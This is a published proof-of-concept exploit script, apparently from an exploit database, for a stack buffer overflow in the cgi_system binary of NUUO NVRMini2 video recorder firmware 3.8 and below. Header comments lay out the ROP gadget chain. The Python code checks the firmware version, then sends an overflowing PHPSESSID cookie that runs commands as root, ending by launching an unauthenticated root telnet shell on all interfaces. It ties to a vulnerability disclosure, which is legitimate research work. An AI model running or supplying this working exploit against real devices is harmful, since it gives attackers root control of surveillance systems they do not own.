# Exploit Title: NUUO NVRMini2 3.8 - 'cgi_system' Buffer Overflow (Enable Telnet)
# Date: 2018-09-17
# Exploit Author: Jacob Baines
# Vendor Homepage: https://www.nuuo.com/
# Device: NRVMini2
# Software Link: https://www.nuuo.com/ProductNode.php?node=2
# Versions: 3.8.0 and below
# Tested Against: 03.07.0000.0011 and 03.08.0000.0005
# Tested on: Ubuntu and OSX
# CVE: N/A
# TRA: https://www.tenable.com/security/research/tra-2018-25
# Description:

# A stack buffer overflow exists in the cgi_system binary. The error occurs
# due to lack of bounds checking on the PHPSESSID value before and when
# it is passed to sprintf in order to generate the session id file name.
# As written, this exploit enables Telnet.

# Executes a command via the stack buffer overflow in cookie parsing. The command
# is executed via 'system' as root. The overlow logic is like so:
#
# address 1: 405e2e34 - load system into r3 and address 2 into lr
#
# .text:000D0E34 0F 48 BD E8                 LDMFD   SP!, {R0-R3,R11,LR}
# .text:000D0E38 1E FF 2F E1                 BX      LR
#
# address 2: 406037cc - load the system command into r0. Jump to system.
#
# .text:000F17CC 0D 00 A0 E1                 MOV     R0, SP
# .text:000F17D0 33 FF 2F E1                 BLX     R3
#
# [   address 1  ][       r0     ][      r1      ][      r2      ][  r3 system   ][      r11     ][  LR - addr2  ][ system command ]
# \x34\x2e\x5e\x40\xaa\xaa\xaa\xaa\xbb\xbb\xbb\xbb\xcc\xcc\xcc\xcc\xfc\xbf\x54\x40\xee\xee\xee\xee\xcc\x37\x60\x40touch /tmp/lolwat

# PoC

import requests
import socket
import sys

def stack_buffer_overflow(command, ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print '[+] Executing %s on %s:%s...' % (command, ip, port)
    sock.connect((ip, int(port)))
    exec_request = ('GET /cgi-bin/cgi_system?cmd=portCheck HTTP/1.1\r\n' +
                    'Host: ' + ip + ':' + port + '\r\n' +
                    'Accept: */*\r\n' +
                    'Cookie: PHPSESSID=982e6c010064b3878a4b793bfab8d2d2' +
                    'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAAAABBBBCCCCDD' +
                    '\x34\x2e\x5e\x40\xaa\xaa\xaa\xaa\xbb\xbb\xbb\xbb\xcc\xcc\xcc\xcc\xfc\xbf\x54\x40\xee\xee\xee\xee\xcc\x37\x60\x40' + command +
                    '\r\n\r\n')
    sock.sendall(exec_request)
    data = sock.recv(1024)
    sock.close()

    # We should get a 500 Internal error in response
    return data.find('500') != -1

# Quickly tries to grab the version of the target. If the target is
# using anything other than 3.7 or 3.8 then we'll bail out since
# haven't tested on any other targets

def check_target(ip, port):
    index = requests.get('http://' + ip + ':' + port + "/upgrade_handle.php?cmd=getcurrentinfo")
    return (index.text.find('<Titan>03.08') != -1 or index.text.find('<Titan>03.07') != -1)

if __name__ == "__main__":

    if (len(sys.argv) != 3):
        print "Usage: python nvrmini2_enable_telnet.py <ipv4 address> <port>"
        sys.exit(1)

    ip = sys.argv[1]
    port = sys.argv[2]

    if int(port) > 65535:
        print('[-] Invalid port parameter')
        sys.exit(0)

    if len(ip.split('.')) != 4:
        print('[-] Invalid IP address parameter')
        sys.exit(0)

    print '[+] Checking for a valid target...'
    if (check_target(ip, port) == False):
        print('[-] The target is not a NVRMini2 or its using an untested version.')
        sys.exit(0)
    print '[+] Valid target!'

    if (stack_buffer_overflow('mount -t devpts devpts /dev/pts', ip, port) == False):
        print('[-] Mount failed')
        sys.exit(0)

    if (stack_buffer_overflow('/bin/sh -c "/usr/sbin/telnetd -l /bin/bash -b 0.0.0.0"&', ip, port) == False):
        print('[-] telnetd bind failed')
        sys.exit(0)

    print('[+] Success!')